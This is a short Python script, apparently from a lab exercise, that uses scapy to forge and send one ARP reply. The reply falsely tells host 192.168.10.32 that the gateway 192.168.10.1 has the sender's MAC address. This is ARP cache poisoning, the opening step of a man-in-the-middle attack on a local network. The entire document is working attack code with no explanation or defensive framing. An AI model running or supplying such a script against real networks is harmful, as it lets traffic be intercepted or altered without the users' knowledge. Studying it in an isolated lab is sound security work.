#!/usr/bin/env python3
from scapy.all import *
arp_reply = (Ether(dst="00:0c:29:d3:85:ab") / ARP(op=2, psrc="192.168.10.1", 
             hwsrc="00:0c:29:69:a3:9a", pdst="192.168.10.32", 
             hwdst="00:0c:29:d3:85:ab"))
sendp(arp_reply, iface="eth0")
